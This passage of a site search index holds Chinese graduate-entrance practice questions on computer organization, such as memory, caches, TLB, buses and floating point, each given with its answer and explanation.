1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#11-mon","text":"\u4e0b\u5217\u8bf4\u6cd5\u6b63\u786e\u7684\u662f \u3002 [\u56fd\u9632\u79d1\u6280\u5927\u5b66] \u2160\uff0e\u5728\u5fae\u578b\u8ba1\u7b97\u673a\u7684\u5e7f\u6cdb\u5e94\u7528\u4e2d\uff0c\u4f1a\u8ba1\u7535\u7b97\u5316\u5c5e\u4e8e\u79d1\u5b66\u8ba1\u7b97\u65b9\u9762\u7684\u5e94\u7528 \u2161\uff0e\u51b3\u5b9a\u8ba1\u7b97\u673a\u8ba1\u7b97\u7cbe\u5ea6\u7684\u4e3b\u8981\u6280\u672f\u662f\u8ba1\u7b97\u673a\u7684\u5b57\u957f \u2162\uff0e\u8ba1\u7b97\u673a\u201c\u8fd0\u7b97\u901f\u5ea6\u201d\u6307\u6807\u7684\u542b\u4e49\u662f\u6bcf\u79d2\u949f\u80fd\u6267\u884c\u591a\u5c11\u6761\u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u4ee4 \u2163\uff0e\u5229\u7528\u5927\u89c4\u6a21\u96c6\u6210\u7535\u8def\u6280\u672f\u628a\u8ba1\u7b97\u673a\u7684\u8fd0\u7b97\u90e8\u4ef6\u548c\u63a7\u5236\u90e8\u4ef6\u505a\u5728\u4e00\u5757\u96c6\u6210\u7535\u8def\u82af\u7247\u4e0a\uff0c\u8fd9\u6837\u7684\u4e00\u5757\u82af\u7247\u53eb\u5355\u7247\u673a A\uff0e\u2160\u3001\u2162 B\uff0e\u2161\u3001\u2163 C\uff0e\u2161 D\uff0e\u2160\u3001\u2162\u3001\u2163 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u4f1a\u8ba1\u7535\u7b97\u5316\u5c5e\u4e8e\u8ba1\u7b97\u673a\u6570\u636e\u5904\u7406\u65b9\u9762\u7684\u5e94\u7528\uff0c\u2160 \u9519\u8bef\u3002\u2161 \u663e\u7136\u6b63\u786e\u3002\u8ba1\u7b97\u673a\u201c\u8fd0\u7b97\u901f\u5ea6\u201d\u6307\u6807\u7684\u542b \u4e49\u662f\u6bcf\u79d2\u949f\u80fd\u6267\u884c\u591a\u5c11\u6761\u6307\u4ee4\uff0c\u2162 \u9519\u8bef\u3002\u5229\u7528\u5927\u89c4\u6a21\u96c6\u6210\u7535\u8def\u6280\u672f\u628a\u8ba1\u7b97\u673a\u7684\u8fd0\u7b97\u90e8\u4ef6\u548c\u63a7\u5236\u90e8\u4ef6\u505a\u5728\u4e00\u5757\u96c6\u6210 \u7535\u8def\u82af\u7247\u4e0a\uff0c\u8fd9\u6837\u96c6\u6210\u7684\u82af\u7247\u79f0\u4e3aCPU\uff0c\u2163\u9519\u8bef\u3002","title":"1.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#12-tue","text":"\u67d0DRAM \u82af\u7247\u5185\u90e8\u5b58\u50a8\u5143\u6392\u5217\u62101024\u00d71024 \u7684\u77e9\u9635\uff0c\u4e14\u5df2\u77e5\u5176\u5b58\u53d6\u5468\u671f\u4e3a0.1\u03bcs\uff0c\u6700\u5927\u5237\u65b0\u95f4\u9694\u4e3a2ms\u3002\u5f53\u91c7\u7528\u5f02\u6b65\u5237\u65b0\u65b9\u5f0f\u65f6\uff0c\u6b7b\u65f6\u95f4 [\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e\uff1d2ms B\uff0e\u2248 0.1ms C\uff0e\uff1d0.2\u03bcs D\uff0e\uff1d0.1\u03bcs \u7b54\u6848 \u7b54\u7591\uff1aD \u89e3\u6790\uff1a\u5f53\u91c7\u7528\u5f02\u6b65\u5237\u65b0\u65b9\u5f0f\u65f6\uff0c\u5c06\u5bf9DRAM \u82af\u7247\u51851024 \u884c\u7684\u5237\u65b0\u5747\u5300\u5206\u5e03\u57282ms \u5185\u7684\u4e0d\u540c\u65f6\u95f4\uff0c\u6bcf\u6b21 \u5237\u65b0\u4e00\u884c\uff1b\u8fd9\u6837\u6bcf\u6b21\u5237\u65b0\u53ea\u9700\u505c\u6b62\u4e00\u4e2a\u5b58\u53d6\u5468\u671f\uff0c\u5373\u201c\u6b7b\u65f6\u95f4\u201d\u4e3a\u4e00\u4e2a\u5b58\u53d6\u5468\u671f0.1\u03bcs\uff0c\u56e0\u6b64\u7b54\u6848\u9009D\u3002","title":"1.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#13-wed","text":"\u7528\u4e8e\u79d1\u5b66\u8ba1\u7b97\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u6807\u5fd7\u7cfb\u7edf\u6027\u80fd\u7684\u4e3b\u8981\u53c2\u6570\u662f \u3002[\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e\u4e3b\u65f6\u949f\u9891\u7387 B\uff0e\u4e3b\u5b58\u5bb9\u91cf C\uff0eMFLOPS D\uff0eMIPS \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aAB \u4e24\u9879\uff0c\u6240\u6307\u53c2\u6570\u8d8a\u5927\u8d8a\u6709\u5229\u4e8e\u63d0\u9ad8\u7cfb\u7edf\u6027\u80fd\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u6807\u5fd7\u6027\u80fd\u7684\u4e3b\u8981\u53c2\u6570\uff0c\u4e0d\u540c\u9891\u7387\u6216\u8005 \u4e3b\u5b58\u5bb9\u91cf\u7684\u8ba1\u7b97\u673a\u5982\u679c\u8fd0\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u5f97\u5230\u7684\u6027\u80fd\u5e76\u4e0d\u4e00\u5b9a\u662f\u9ad8\u9891\u7387\u6216\u5927\u4e3b\u5b58\u7684\u5c31\u4e00\u5b9a\u597d\u3002D \u9879\uff0cMIPS \u662f\u6bcf \u79d2\u6267\u884c\u767e\u4e07\u6761\u6307\u4ee4\u6761\u6570\uff0c\u662f\u7528\u6765\u63cf\u8ff0\u4e00\u822c\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6027\u80fd\u7684\u3002MFLOPS\uff08\u6bcf\u79d2\u6267\u884c\u767e\u4e07\u6761\u6d6e\u70b9\u6307\u4ee4\u6761\u6570\uff09\u7528\u6765 \u63cf\u8ff0\u8ba1\u7b97\u673a\u6d6e\u70b9\u6027\u80fd\uff0c\u800c\u7528\u4e8e\u79d1\u5b66\u8ba1\u7b97\u7684\u8ba1\u7b97\u673a\u4e3b\u8981\u5c31\u662f\u770b\u6d6e\u70b9\u7684\u6027\u80fd\u3002","title":"1.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#14-thu","text":"\u67d0\u673a\u5668\u91c7\u7528\u56db\u4f53\u4f4e\u4f4d\u4ea4\u53c9\u5b58\u50a8\u5668\uff0c \u73b0\u5206\u522b\u6267\u884c\u4e0b\u8ff0\u64cd\u4f5c\uff1a \uff081\uff09\u8bfb\u53d66 \u4e2a\u8fde\u7eed\u5730\u5740\u5355\u5143\u4e2d\u5b58\u653e\u7684\u5b58\u50a8\u5b57\uff0c \u91cd\u590d80 \u6b21\uff1b \uff082\uff09\u8bfb\u53d68 \u4e2a\u8fde\u7eed\u5730\u5740\u5355\u5143\u4e2d\u5b58\u653e\u7684\u5b58\u50a8\u5b57\uff0c\u91cd\u590d60 \u6b21\u3002 \u5219\uff081\uff09\u3001\uff082\uff09\u6240\u82b1\u65f6\u95f4\u4e4b\u6bd4\u4e3a \u3002[\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e1:1 B\uff0e2:1 C\uff0e4:3 D\uff0e3:4 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5047\u8bbe\u5b58\u50a8\u5668\u7684\u5b58\u53d6\u5468\u671f\u4e3aT\uff0c\uff081\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u8fde\u7eed\u8bfb\u53d66 \u4e2a\u5b58\u50a8\u5b57\u9700\u65f6T\uff0b\uff086\uff0d1\uff09\u00d7\uff08T/4\uff09\uff1d2.25T\uff0c\u4f46\u5b58\u653e\u8fde\u7eed\u5b57\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7684\u5b58\u50a8\u5668\u9700\u52302T \u65f6\u95f4\u540e\u624d\u80fd\u8fdb\u884c\u4e0b\u4e00\u8f6e\u8bfb\u53d6\uff0c\u6545\uff081\uff09\u5171\u9700\u65f62T\u00d7\uff0880\uff0d1\uff09 \uff0b2.25T \uff1d160.25T\uff1b\uff082\uff09\u7684\u60c5\u51b5\u540c\u7406\uff0c\u4e00\u8f6e\u8bfb\u53d6\u9700\u65f6T\uff0b\uff088\uff0d1\uff09\u00d7\uff08T/4 \uff09\uff1d2.75T \uff0c\u4f46\u5f00\u59cb\u4e0b\u4e00\u8f6e\u8bfb\u53d6\u97003T \u65f6 \u95f4\u540e\uff0c\u6545\uff082\uff09\u5171\u9700\u65f62T\u00d7\uff0860\uff0d1\uff09\uff0b 2.75T\uff1d120.75T\uff1b\u7efc\u5408\u4e0a\u8ff0\u5206\u6790\uff0c \uff081\uff09\u3001 \uff082\uff09\u6240\u82b1\u65f6\u95f4\u4e4b\u6bd4\u7ea6\u4e3a4:3\u3002","title":"1.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#15-fri","text":"\u67d0\u8ba1\u7b97\u673a\u4e3b\u5b58\u5730\u5740\u7a7a\u95f4\u5927\u5c0f\u4e3a256MB\uff0c\u6309\u5b57\u8282\u7f16\u5740\u3002\u865a\u62df\u5730\u7a7a\u95f4\u5927\u5c0f\u4e3a4GB\uff0c\u91c7\u7528\u9875\u5f0f\u5b58\u50a8\u7ba1\u7406\uff0c\u9875\u9762 \u5927\u5c0f\u4e3a4KB\uff0cTLB\uff08\u5feb\u8868\uff09\u91c7\u7528\u5168\u76f8\u8054\u6620\u5c04\uff0c\u67094 \u4e2a\u9875\u8868\u9879\uff0c\u5185\u5bb9\u5982\u4e0b\u8868\u6240\u793a \u6709\u6548\u4f4d \u6807\u8bb0 \u9875\u6846\u53f7 ... 0 FF180H 0002H C1 1 3FFF1H 0035H C2 0 02FF3H 0351H C3 1 03FFFH 0153H C3 \u5219\u5bf9\u865a\u62df\u5730\u574003FFF180H \u8fdb\u884c\u865a\u5b9e\u5730\u5740\u53d8\u6362\u7684\u7ed3\u679c\u662f \u3002[\u5317\u4eac\u79d1\u6280\u5927\u5b66] A\uff0e0153180H B\uff0e0035180H C\uff0eTLB \u7f3a\u5931 D\uff0e\u7f3a\u9875 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u7531\u4e8e\u4e3b\u5b58\u5730\u5740\u7a7a\u95f4\u6309\u5b57\u8282\u7f16\u5740\uff0c\u9875\u9762\u5927\u5c0f\u4e3a4KB\uff0c\u865a\u62df\u5730\u5740\u4e3a03FF F180H\uff0c\u6240\u4ee5\u9875\u53f7\u4e3a03FFFH\uff0c \u9875\u5185\u5730\u5740\u4e3a180H\uff0c\u6839\u636e\u9898\u76ee\u4e2d\u7ed9\u51fa\u7684\u9875\u8868\u9879\u53ef\u77e5\u9875\u6807\u8bb0\u4e3a03FFFH \u6240\u5bf9\u5e94\u7684\u9875\u6846\u53f7\u4e3a0153H\uff0c\u4e14\u6709\u6548\u4f4d\u4e3a1\uff0c\u5219 \u9875\u6846\u53f7\u4e0e\u9875\u5185\u5730\u5740\u4e4b\u548c\u5373\u4e3a\u7269\u7406\u5730\u5740015 3180H\u3002","title":"1.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2-week-2","text":"","title":"2. Week 2"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#21-sat","text":"\u4e0b\u5217\u6709\u5173\u6d6e\u70b9\u6570\u52a0\u51cf\u8fd0\u7b97\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f [\u71d5\u5c71\u5927\u5b66810] \u2160\uff0e\u5bf9\u9636\u64cd\u4f5c\u4e0d\u4f1a\u5f15\u8d77\u9636\u7801\u4e0a\u6ea2\u6216\u4e0b\u6ea2 \u2161\uff0e\u53f3\u89c4\u548c\u5c3e\u6570\u820d\u5165\u90fd\u53ef\u80fd\u5f15\u8d77\u9636\u7801\u4e0a\u6ea2 \u2162\uff0e\u5de6\u89c4\u65f6\u53ef\u80fd\u5f15\u8d77\u9636\u7801\u4e0b\u6ea2 \u2163\uff0e\u5c3e\u6570\u6ea2\u51fa\u65f6\u7ed3\u679c\u4e0d\u4e00\u5b9a\u6ea2\u51fa A\uff0e\u4ec5\u2161\u3001\u2162 B\uff0e\u4ec5\u2160\u3001\u2161\u3001\u2163 C\uff0e\u4ec5\u2160\u3001\u2162\u3001\u2163 D\uff0e\u2160\u3001\u2161\u3001\u2162\u3001\u2163 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u6d6e\u70b9\u6570\u7684\u52a0\u51cf\u8fd0\u7b97\u6b65\u9aa4\u5305\u62ec\uff1a \u2460\u5bf9\u9636\uff0c\u4f7f\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5bf9\u9f50\uff0c\u9636\u7801\u5c0f\u7684\u5c3e\u6570\u53f3\u79fb\uff0c\u53ef\u80fd \u4ea7\u751f\u6ea2\u51fa\uff0c\u4f46\u662f\u9636\u7801\u4e0d\u4f1a\u6ea2\u51fa\uff1b \u2461\u5c3e\u6570\u6c42\u548c\uff0c\u5c06\u5bf9\u9636\u540e\u7684\u5c3e\u6570\u6309\u5b9a\u70b9\u6570\u52a0(\u51cf\uff09\u8fd0\u7b97\u89c4\u5219\u8fd0\u7b97\uff1b \u2462\u89c4\u683c\u5316\uff0c\u5305\u62ec\u5de6\u89c4\u548c\u53f3\u89c4\uff0c\u5de6\u89c4\u65f6\u9636\u7801\u51cf\u5c11\uff0c\u53ef\u80fd\u51fa\u73b0\u9636\u7801\u4e0b\u6ea2\uff0c\u800c\u53f3\u89c4\u65f6\uff0c\u9636\u7801\u589e\u52a0\u53ef\u80fd\u51fa\u73b0\u9636\u7801\u4e0a\u6ea2\uff1b \u2463\u820d\u5165\uff0c\u8be5\u8fc7\u7a0b\u53ef\u80fd\u9700\u8981\u53f3\u89c4\u8c03\u6574\u56e0\u6b64\u53ef\u80fd\u51fa\u73b0\u9636\u7801\u4e0a\u6ea2\uff1b \u2464\u6ea2\u51fa\u5224\u65ad\uff0c\u6d6e\u70b9\u6570\u7684\u6ea2\u51fa\u4e0e\u5426\u662f\u7531\u9636\u7801\u7684\u7b26\u53f7\u51b3\u5b9a\u7684\uff0c\u800c\u4e0d\u662f\u7531\u5c3e \u6570\u6ea2\u51fa\u5224\u65ad\u7684\uff0c\u56e0\u6b64\u5c3e\u6570\u6ea2\u51fa\u65f6\u7ed3\u679c\u4e0d\u4e00\u5b9a\u6ea2\u51fa\u3002\u56e0\u6b64\u2160\u3001\u2161\u3001\u2162\u3001\u2163\u5747\u6b63\u786e\u3002","title":"2.1. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#22-sun","text":"\u8ba1\u7b97\u673a\u4e2d\u5e38\u91c7\u7528\u4e0b\u5217\u51e0\u79cd\u7f16\u7801\u8868\u793a\u6570\u636e\uff0c\u5176\u4e2d\uff0c\u00b10\u7f16\u7801\u76f8\u540c\u7684\u662f \u3002[\u71d5\u5c71\u5927\u5b66810] \u2160 \u539f\u7801 \u2161 \u53cd\u7801 \u2162 \u8865\u7801 \u2163 \u79fb\u7801 A\uff0e\u2160\u548c\u2162 B\uff0e\u2161\u548c\u2162 C\uff0e\u2162\u548c\u2163 D\uff0e\u2160\u548c\u2163 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5047\u8bbe\u5b57\u957f\u4e3a8\u4f4d\uff0c[+0]\u539f=00000000\uff0c[-0]\u539f=10000000\uff1b[+0]\u53cd=00000000\uff0c[-0]\u53cd=11111111\uff1b[+0]\u8865=[-0]\u8865=00000000\uff1b[+0]\u79fb=[-0]\u79fb=10000000\u3002 \u5bf9\u4e8e\u771f\u503c0\uff0c\u539f\u7801\u548c\u53cd\u7801\u5404\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u8868\u793a\u5f62\u5f0f\uff0c\u800c\u8865\u7801\u548c\u79fb\u7801\u53ea\u6709\u552f\u4e00\u7684\u4e00\u79cd\u8868\u793a\u5f62\u5f0f\u3002\u6b63\u56e0\u4e3a\u8865\u7801\u548c\u79fb\u78010\u7684\u8868\u793a\u5f62\u5f0f\u552f\u4e00\uff0c\u624d\u4f7f\u5f97\u8865\u7801\u548c\u79fb\u7801\u6bd4\u539f\u7801\u548c\u53cd\u7801\u80fd\u591a\u8868\u793a\u4e00\u4e2a\u8d1f\u6570\u3002","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#3-week-3","text":"","title":"3. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#31-mon","text":"\u91c7\u7528\u6307\u4ee4Cache \u4e0e\u6570\u636eCache \u5206\u79bb\u7684\u4e3b\u8981\u76ee\u7684\u662f \u3002[\u71d5\u5c71\u5927\u5b66810] A\uff0e\u51cf\u4f4eCache \u7684\u7f3a\u5931\u635f\u5931 B\uff0e\u63d0\u9ad8Cache \u7684\u547d\u4e2d\u7387 C\uff0e\u51cf\u4f4eCPU \u5e73\u5747\u8bbf\u95ee\u65f6\u95f4 D\uff0e\u51cf\u5c11\u6307\u4ee4\u6d41\u6c34\u7ebf\u8d44\u6e90\u51b2\u7a81 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1aCache\u5206\u4e3a\u4e00\u7ea7L1\u548c\u4e8c\u7ea7L2\u3002L1\u96c6\u6210\u5728CPU\u4e2d\uff0c\u79f0\u4e3a\u7247\u5185Cache\u3002\u5728L1\u4e2d\u8fd8\u5206\u6570\u636eCache\u548c\u6307\u4ee4Cache\u3002\u5206\u522b\u7528\u6765\u5b58\u653e\u6570\u636e\u548c\u6267\u884c\u8fd9\u4e9b\u6570\u636e\u7684\u6307\u4ee4\uff0c\u4e24\u4e2aCache\u53ef\u4ee5\u540c\u65f6\u88abCPU\u8bbf\u95ee\uff0c\u51cf\u5c11\u4e86\u4e89\u7528Cache\u6240\u9020\u6210\u7684\u51b2\u7a81\uff0c\u63d0\u9ad8\u4e86\u5904\u7406\u5668\u6548\u80fd\u3002","title":"3.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#32-tue","text":"\u4e0b\u5217\u547d\u4ee4\u7ec4\u5408\u60c5\u51b5\uff0c\u4e00\u6b21\u8bbf\u5b58\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u80fd\u53d1\u751f\u7684\u662f [\u71d5\u5c71\u5927\u5b66810] A.TLB\u672a\u547d\u4e2d\uff0cCache\u672a\u547d\u4e2d\uff0cPage\u672a\u547d\u4e2d B.TLB\u672a\u547d\u4e2d\uff0cCache\u547d\u4e2d\uff0cPage\u547d\u4e2d C.TLB\u547d\u4e2d\uff0cCache\u672a\u547d\u4e2d\uff0cPage\u547d\u4e2d D.TLB\u547d\u4e2d\uff0cCache\u547d\u4e2d\uff0cPage\u672a\u547d\u4e2d \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8003\u70b9\uff1aTLB\uff0cCache\uff0cPage\u7684\u542b\u4e49\u3002 TLB\u5373\u4e3a\u5feb\u8868\uff0c\u5feb\u8868\u53ea\u662f\u6162\u8868(Page)\u7684\u5c0f\u5c0f\u526f\u672c\uff0c\u56e0\u6b64TLB\u547d\u4e2d\uff0c\u5fc5\u7136Page\u4e5f\u547d\u4e2d\uff0c\u800c\u5f53Page\u547d\u4e2d\uff0cTLB\u5219\u672a\u5fc5\u547d\u4e2d\uff0c\u6545D\u4e0d\u53ef\u80fd\u53d1\u751f\uff1b\u800cCache\u7684\u547d\u4e2d\u4e0e\u5426\u4e0eTLB\u3001Page\u7684\u547d\u4e2d\u4e0e\u5426\u5e76\u65e0\u5fc5\u7136\u8054\u7cfb\u3002","title":"3.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#33-wed","text":"\u4ee5\u4e0b\u6709\u5173\u603b\u7ebf\u8bf4\u6cd5\u9519\u8bef\u7684\u662f [\u71d5\u5c71\u5927\u5b66810] A\uff0e\u603b\u7ebf\u7ba1\u7406\u4e3b\u8981\u5305\u62ec\u5224\u4f18\u63a7\u5236\u548c\u901a\u4fe1\u63a7\u5236 B\uff0e\u96c6\u4e2d\u5f0f\u603b\u7ebf\u5224\u4f18\u63a7\u5236\u903b\u8f91\u6709\u94fe\u5f0f\u67e5\u8be2\u548c\u8ba1\u6570\u5668\u5b9a\u65f6\u67e5\u8be2\u4e24\u79cd\u65b9\u5f0f C\uff0e\u94fe\u5f0f\u67e5\u8be2\u9700\u8981\u589e\u52a02 \u6839\u63a7\u5236\u7ebf\uff0c\u5176\u4f18\u5148\u7ea7\u8fde\u63a5\u56fa\u5b9a\uff0c\u65e0\u7075\u6d3b\u6027 D\uff0e\u5b9a\u65f6\u67e5\u8be2\u9700\u8981\u589e\u52a0log2N \u6839\u63a7\u5236\u7ebf\uff0c\u5176\u4e2dN \u662f\u6240\u5141\u8bb8\u63a5\u7eb3\u7684\u6700\u5927\u8bbe\u5907\u6570\uff0c\u4f18\u5148\u7ea7\u53ef\u7528\u7a0b\u5e8f\u6539\u53d8\uff0c\u7075\u6d3b \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u96c6\u4e2d\u5f0f\u603b\u7ebf\u5224\u4f18\u63a7\u5236\u903b\u8f91\u6709\u94fe\u5f0f\u67e5\u8be2\u3001\u8ba1\u6570\u5668\u5b9a\u65f6\u67e5\u8be2\u548c\u72ec\u7acb\u8bf7\u6c42\u4e09\u79cd\u65b9\u5f0f\u3002","title":"3.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#34-thu","text":"\u67d0\u540c\u6b65\u603b\u7ebf\u7684\u65f6\u949f\u9891\u7387\u4e3a100MHz \uff0c\u5bbd\u5ea6\u4e3a32 \u4f4d\uff0c\u5730\u5740/\u6570\u636e\u7ebf\u590d\u7528\uff0c \u6bcf\u4f20\u8f93\u4e00\u4e2a\u5730\u5740\u6216\u6570\u636e\u5360\u7528\u4e00\u4e2a\u65f6 \u949f\u5468\u671f\u3002\u82e5\u8be5\u603b\u7ebf\u652f\u6301\u7a81\u53d1\uff08\u731d\u53d1\uff09\u4f20\u8f93\u65b9\u5f0f\uff0c\u5219\u4e00\u6b21\u201c\u4e3b\u5b58\u5199\u201d\u603b\u7ebf\u4e8b\u52a1\u4f20\u8f93128 \u4f4d\u6570\u636e\u6240\u9700\u8981\u7684\u65f6\u95f4\u81f3\u5c11\u662f [\u71d5\u5c71\u5927\u5b66810] A\uff0e20ns B\uff0e40ns C\uff0e50ns D\uff0e80ns \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u603b\u7ebf\u7684\u65f6\u949f\u9891\u7387\u4e3a100MHz\uff0c\u5219\u65f6\u949f\u5468\u671f\u4e3a10ns\u3002\u6570\u636e\u662f128 \u4f4d\uff0c\u603b\u7ebf\u5bbd\u5ea6\u662f32 \u4f4d\uff0c\u6240\u4ee5\u9700\u89814 \u4e2a\u65f6\u949f\u5468\u671f\uff0c\u800c\u4f20\u8f93\u5730\u5740\u8fd8\u9700\u8981\u4e00\u4e2a\u5468\u671f\uff0c\u6240\u4ee5\u4f20\u8f93\u4e00\u4e2a128 \u4f4d\u7684\u6570\u636e\u81f3\u5c11\u9700\u89815 \u4e2a\u65f6\u949f\u5468\u671f\uff0c\u6240\u4ee5\u81f3\u5c11\u9700\u898110ns*5 \uff1d50ns\u3002","title":"3.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#4-week-4","text":"","title":"4. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#41-tue","text":"\u6709\u5173\u6307\u4ee4\u548c\u5fae\u6307\u4ee4\u4e4b\u95f4\u5173\u7cfb\u7684\u63cf\u8ff0\u4e2d\uff0c\u4e0b\u5217\u9009\u9879\u6b63\u786e\u7684\u662f [\u56fd\u9632\u79d1\u6280\u5927\u5b66821-2018] A\uff0e\u4e00\u6761\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u6761\u5fae\u6307\u4ee4\u6765\u5b9e\u73b0 B\uff0e\u4e00\u6761\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u4e2a\u5fae\u7a0b\u5e8f\u6765\u5b9e\u73b0 C\uff0e\u4e00\u6761\u5fae\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u6761\u6307\u4ee4\u6765\u5b9e\u73b0 D\uff0e\u4e00\u6761\u5fae\u6307\u4ee4\u7684\u529f\u80fd\u901a\u8fc7\u6267\u884c\u4e00\u4e2a\u5fae\u7a0b\u5e8f\u6765\u5b9e\u73b0 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5728\u5fae\u7a0b\u5e8f\u63a7\u5236\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c06\u7531\u540c\u65f6\u53d1\u51fa\u7684\u63a7\u5236\u4fe1\u53f7\u6240\u6267\u884c\u7684\u4e00\u7ec4\u5fae\u64cd\u4f5c\u79f0\u4e3a\u5fae\u6307\u4ee4\uff0c\u6240\u4ee5\u5fae\u6307\u4ee4\u5c31\u662f\u628a\u540c\u65f6\u53d1\u51fa\u7684\u63a7\u5236\u4fe1\u53f7\u7684\u6709\u5173\u4fe1\u606f\u6c47\u96c6\u8d77\u6765\u800c\u5f62\u6210\u7684\u3002\u5c06\u4e00\u6761\u6307\u4ee4\u5206\u6210\u82e5\u5e72\u6761\u5fae\u6307\u4ee4\uff0c\u6309\u6b21\u5e8f\u6267\u884c\u8fd9\u4e9b\u5fae\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u6307\u4ee4\u7684\u529f\u80fd\u3002 